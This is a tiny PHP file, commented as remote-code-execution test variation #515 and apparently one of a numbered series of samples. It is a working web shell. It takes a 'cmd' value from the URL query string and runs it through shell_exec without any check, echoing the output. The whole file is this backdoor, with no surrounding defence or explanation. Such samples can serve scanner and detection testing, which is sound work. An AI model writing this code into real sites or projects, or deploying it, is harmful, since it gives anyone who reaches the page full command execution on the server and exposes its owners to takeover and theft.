<?php
// RCE test variation #515
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>